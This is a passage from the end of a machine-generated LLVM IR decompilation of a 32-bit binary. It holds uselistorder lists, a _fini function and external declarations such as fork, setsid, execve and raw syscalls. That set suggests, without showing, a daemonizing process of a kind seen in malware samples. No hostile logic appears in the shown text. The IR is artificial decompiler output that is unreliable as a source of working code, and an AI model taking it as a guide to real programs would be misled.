555, 154, 155, 560, 561, 970, 971, 562, 115, 565, 564, 563, 145, 566, 961, 962, 963, 860, 861, 815, 816, 427, 567, 114, 944, 945, 946, 947, 948, 949, 950, 817, 939, 940, 941, 569, 568, 82, 81, 80, 779, 780, 571, 570, 76, 75, 74, 879, 1049, 572, 49, 48, 50, 573, 574, 906, 907, 908, 291, 126, 369, 370, 371, 905, 575, 372, 373, 904, 292, 3, 577, 576, 215, 374, 578, 150, 375, 579, 131, 337, 580, 167, 818, 819, 725, 294, 820, 821, 822, 823, 824, 826, 827, 828, 295, 829, 830, 406, 293, 831, 296, 832, 833, 834, 825, 584, 583, 582, 581, 110, 112, 111, 107, 109, 108, 113, 835, 585, 143, 140, 142, 141, 297, 586, 836, 837, 588, 587, 127, 128, 838, 839, 263, 262, 254, 840, 338, 841, 842, 261, 843, 298, 844, 376, 845, 590, 589, 103, 105, 104, 106, 299, 377, 4, 378, 591, 592, 166, 165, 1044, 594, 593, 216, 217, 339, 1048, 595, 223, 379, 226, 380, 909, 910, 911, 912, 913, 914, 915, 916, 270, 917, 599, 598, 597, 596, 77, 78, 602, 601, 600, 603, 381, 890, 891, 382, 383, 892, 605, 604, 607, 606, 73, 609, 608, 64, 610, 33, 611, 218, 613, 612, 120, 614, 38, 615, 123, 616, 129, 27, 618, 617, 169, 619, 99, 620, 178, 621, 219, 622, 623, 625, 624, 144, 626, 164, 628, 627, 177, 630, 629, 170, 631, 632, 118, 125, 765, 249, 250, 393, 271, 766, 5, 6, 232, 392, 767, 726, 768, 769, 770, 771, 772, 773, 774, 340, 300, 775, 268, 384, 407, 776, 727, 385, 641, 640, 639, 428, 638, 637, 636, 635, 634, 633, 420, 83, 85, 84, 777, 778, 647, 646, 645, 644, 421, 643, 642, 408, 781, 782, 648, 787, 788, 728, 301, 302, 729, 303, 730, 304, 731, 305, 306, 732, 733, 734, 735, 736, 651, 650, 649, 224, 225, 796, 737, 738, 239, 739, 740, 741, 240, 742, 341, 409, 797, 652, 657, 656, 655, 654, 653, 422, 24, 25, 26, 798, 799, 7, 410, 658, 800, 801, 802, 663, 662, 661, 660, 659, 116, 117, 846, 342, 665, 664, 847, 668, 667, 666, 850, 744, 264, 745, 746, 747, 748, 749, 851, 852, 675, 674, 673, 672, 671, 670, 669, 179, 180, 343, 411, 676, 679, 678, 677, 395, 743, 943, 680, 221, 222, 307, 682, 681, 344, 309, 951, 351, 308, 352, 952, 953, 684, 683, 396, 954, 955, 386, 345, 346, 956, 686, 685, 957, 958, 687, 347, 387, 310, 959, 960, 693, 692, 691, 690, 689, 688, 233, 964, 965, 694, 397, 311, 966, 967, 696, 695, 697, 972, 973, 265, 348, 974, 312, 313, 975, 976, 700, 699, 698, 423, 220, 977, 702, 701, 978, 398, 983, 984, 399, 985, 986, 400, 401, 987, 988, 703, 989, 266, 990, 349, 388, 707, 706, 705, 704, 389, 267, 314, 991, 709, 708, 710, 8, 712, 711, 713, 1024, 1025, 1026, 1034, 1035, 253, 1036, 716, 715, 714, 10, 390, 9, 718, 717, 424, 315, 1027, 252, 1028, 1029, 316, 1030, 251, 1032, 1033, 317, 350, 412, 1031, 425, 1037, 1038, 719, 1039, 1050, 168, 721, 720, 722 }
  uselistorder label %dec_label_pc_8054436, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_805444b = load i32, i32* @ebx, align 4
  %v1_805444c = call i32 @__get_pc_thunk_bx(i32 %v0_805444b)
  store i32 %v1_805444c, i32* @eax, align 4
  %v0_8054457 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8054457

; uselistorder directives
  uselistorder i32* @eax, { 17, 2, 37, 112, 4, 113, 114, 3, 115, 0, 36, 1, 111, 116, 38, 117, 65, 66, 68, 18, 67, 118, 120, 119, 8, 9, 99, 100, 206, 121, 44, 126, 45, 127, 128, 129, 56, 130, 5, 60, 61, 146, 147, 48, 148, 49, 149, 150, 50, 51, 52, 151, 152, 153, 154, 53, 155, 156, 157, 158, 54, 139, 194, 208, 58, 209, 210, 212, 62, 213, 10, 211, 14, 16, 207, 109, 19, 69, 70, 160, 71, 195, 197, 198, 196, 72, 73, 199, 200, 202, 203, 201, 159, 55, 11, 12, 135, 136, 137, 46, 138, 131, 132, 133, 134, 74, 75, 140, 141, 76, 77, 101, 103, 102, 104, 105, 107, 64, 106, 142, 143, 57, 144, 145, 122, 39, 40, 123, 41, 124, 42, 43, 125, 20, 78, 79, 80, 81, 82, 21, 83, 22, 24, 23, 26, 25, 27, 84, 28, 29, 85, 86, 87, 47, 88, 59, 89, 30, 90, 31, 32, 91, 92, 93, 94, 95, 96, 97, 33, 98, 108, 34, 7, 6, 35, 63, 110, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 189, 186, 187, 188, 190, 191, 192, 193, 214, 204, 205, 13, 15 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1061, 14, 15, 16, 64, 672, 1062, 1065, 1063, 1064, 673, 929, 930, 17, 66, 1068, 1076, 1070, 1071, 18, 55, 1072, 1073, 1074, 674, 1075, 65, 129, 130, 131, 1066, 1067, 139, 1077, 1078, 1080, 1081, 1079, 1082, 283, 1083, 1084, 1085, 1086, 1087, 1088, 140, 141, 675, 362, 363, 110, 790, 676, 791, 792, 69, 70, 793, 794, 795, 648, 796, 68, 677, 67, 678, 142, 0, 1, 679, 143, 144, 680, 681, 682, 145, 683, 1091, 684, 1089, 268, 1090, 364, 365, 146, 2, 3, 685, 1092, 1093, 1094, 1095, 1096, 366, 686, 687, 147, 1097, 19, 71, 902, 113, 114, 688, 1098, 72, 689, 20, 148, 931, 367, 1099, 1100, 1101, 932, 933, 13, 284, 150, 149, 934, 935, 285, 936, 937, 151, 152, 690, 1102, 1103, 691, 938, 692, 939, 940, 941, 942, 1104, 153, 693, 154, 368, 1107, 1108, 1109, 1110, 120, 21, 1111, 73, 1124, 1125, 1138, 1139, 1140, 1141, 1147, 1148, 1149, 1150, 1142, 1143, 1144, 1145, 1146, 74, 75, 694, 1151, 1152, 76, 77, 78, 695, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 155, 1228, 1229, 156, 1230, 1231, 1232, 79, 121, 286, 132, 696, 122, 943, 157, 944, 22, 123, 115, 945, 254, 158, 946, 116, 947, 1112, 1113, 1120, 287, 1121, 697, 948, 369, 949, 950, 951, 952, 953, 954, 955, 956, 159, 698, 957, 958, 959, 960, 160, 961, 699, 161, 249, 370, 162, 700, 701, 702, 288, 962, 1212, 1213, 1214, 289, 278, 279, 1215, 1216, 1217, 1218, 1219, 1220, 703, 290, 963, 163, 704, 964, 164, 291, 292, 965, 966, 705, 967, 968, 969, 970, 107, 1303, 1304, 1305, 1306, 117, 255, 124, 971, 256, 706, 707, 708, 972, 165, 973, 1240, 1255, 1256, 1257, 371, 1258, 915, 1259, 805, 1308, 1309, 1310, 1311, 1312, 797, 1313, 1260, 1261, 1314, 166, 1315, 1326, 1327, 23, 138, 709, 24, 710, 711, 1337, 1341, 257, 1342, 167, 620, 372, 373, 4, 1316, 1317, 1318, 168, 169, 758, 647, 170, 712, 806, 293, 294, 171, 807, 808, 172, 173, 810, 809, 811, 812, 374, 621, 813, 815, 814, 816, 1319, 1320, 174, 713, 1325, 866, 867, 868, 869, 714, 715, 870, 351, 716, 295, 175, 176, 717, 798, 718, 799, 177, 719, 178, 720, 1052, 80, 1053, 1054, 1055, 5, 721, 1193, 375, 800, 801, 802, 803, 722, 179, 1328, 622, 180, 296, 1330, 1333, 1332, 1264, 1265, 1266, 1267, 1268, 297, 1269, 1270, 1271, 376, 1262, 377, 1263, 378, 723, 817, 133, 818, 298, 724, 819, 725, 726, 379, 623, 727, 380, 624, 181, 728, 1272, 1273, 182, 183, 381, 625, 135, 1274, 1275, 1276, 184, 185, 382, 626, 134, 1277, 258, 1278, 118, 1279, 1280, 1282, 729, 1281, 6, 804, 7, 1331, 820, 821, 822, 823, 825, 824, 8, 299, 1241, 1242, 1243, 1171, 730, 300, 1172, 731, 1173, 1174, 1175, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1233, 1221, 186, 187, 732, 733, 301, 1338, 1340, 25, 1069, 188, 189, 974, 975, 136, 976, 190, 734, 977, 259, 125, 978, 81, 1176, 57, 302, 303, 191, 979, 980, 981, 192, 1122, 82, 735, 1114, 736, 1119, 1118, 260, 737, 738, 1115, 1117, 1116, 261, 739, 826, 1123, 827, 982, 983, 984, 985, 986, 987, 988, 989, 990, 193, 740, 991, 304, 992, 993, 994, 995, 996, 26, 27, 741, 280, 281, 997, 998, 999, 1000, 28, 1001, 1002, 1003, 29, 742, 1004, 30, 31, 194, 743, 1005, 1006, 1007, 1010, 1008, 1009, 32, 58, 83, 1011, 1012, 1013, 1014, 352, 1015, 1016, 195, 1017, 196, 1018, 744, 262, 1019, 197, 1020, 745, 1021, 1022, 1024, 1025, 1026, 1027, 1028, 1029, 198, 746, 747, 199, 1030, 1031, 748, 1032, 1033, 1034, 1035, 1036, 749, 1037, 1038, 305, 750, 306, 1039, 1040, 1041, 1042, 1043, 1044, 33, 84, 85, 86, 751, 1045, 200, 752, 1046, 627, 1047, 1048, 201, 753, 119, 56, 108, 1023, 263, 1321, 1322, 264, 1324, 1323, 87, 383, 754, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 307, 1136, 755, 756, 1137, 308, 1049, 202, 1105, 757, 1106, 1307, 203, 1056, 1329, 828, 1222, 1239, 829, 1246, 1334, 137, 309, 1301, 1339, 1247, 1302, 830, 1248, 204, 831, 832, 833, 834, 835, 836, 837, 838, 839, 1200, 1249, 1250, 840, 1335, 1336, 649, 250, 841, 251, 842, 844, 843, 845, 846, 650, 387, 388, 313, 314, 312, 847, 34, 205, 206, 310, 384, 207, 651, 848, 208, 311, 849, 850, 265, 126, 386, 211, 209, 210, 385, 851, 852, 853, 854, 856, 269, 855, 652, 857, 858, 212, 213, 214, 315, 215, 330, 89, 860, 389, 859, 391, 392, 88, 390, 393, 394, 216, 861, 316, 862, 353, 863, 864, 865, 317, 127, 318, 270, 271, 653, 871, 654, 406, 407, 398, 628, 872, 874, 399, 629, 400, 630, 873, 92, 875, 655, 408, 409, 395, 631, 876, 878, 396, 632, 397, 633, 877, 91, 879, 354, 880, 881, 882, 883, 656, 410, 411, 401, 634, 884, 886, 402, 635, 403, 636, 885, 90, 887, 111, 112, 888, 889, 890, 891, 892, 893, 894, 895, 896, 657, 412, 413, 404, 897, 658, 414, 415, 405, 637, 898, 899, 659, 416, 417, 900, 901, 660, 418, 419, 661, 420, 421, 662, 443, 444, 903, 331, 904, 35, 332, 905, 252, 906, 663, 422, 423, 664, 424, 425, 665, 426, 427, 666, 428, 429, 667, 430, 431, 253, 668, 432, 433, 907, 355, 908, 909, 910, 911, 319, 912, 638, 913, 914, 128, 916, 917, 277, 275, 36, 276, 918, 356, 919, 920, 921, 922, 9, 923, 320, 924, 217, 274, 272, 37, 273, 925, 926, 927, 928, 38, 434, 1050, 1051, 93, 59, 94, 282, 436, 218, 435, 639, 640, 219, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 641, 783, 784, 642, 336, 785, 333, 334, 335, 786, 787, 643, 438, 788, 1057, 1058, 39, 97, 1059, 40, 41, 437, 1060, 95, 60, 96, 321, 644, 10, 220, 221, 222, 1185, 439, 1186, 1187, 1188, 322, 1189, 102, 1190, 1191, 1192, 61, 98, 99, 100, 101, 645, 223, 224, 225, 226, 1194, 1196, 1197, 1198, 227, 1199, 228, 229, 230, 337, 1195, 357, 440, 441, 323, 338, 324, 11, 325, 669, 442, 1201, 231, 232, 233, 234, 326, 1202, 235, 236, 339, 1203, 1204, 237, 42, 43, 1209, 103, 62, 1210, 340, 1205, 1206, 327, 238, 1207, 1208, 358, 239, 240, 241, 341, 646, 1211, 1223, 1224, 1225, 670, 342, 242, 243, 344, 1226, 244, 343, 1227, 104, 44, 63, 1234, 1235, 359, 1236, 1237, 45, 1238, 46, 360, 105, 671, 1244, 245, 246, 445, 1245, 247, 328, 1251, 1252, 1253, 1254, 329, 47, 1283, 1284, 1285, 446, 447, 1295, 48, 49, 109, 50, 347, 348, 1286, 1287, 1288, 1289, 266, 345, 346, 349, 1290, 1291, 1292, 1293, 51, 52, 106, 1294, 361, 53, 54, 1296, 1297, 350, 12, 1298, 1299, 1300, 248, 789, 267, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350 }
  uselistorder i32* @ebx, {}
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8** @__decompiler_undefined_function_4() local_unnamed_addr

declare i16 @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
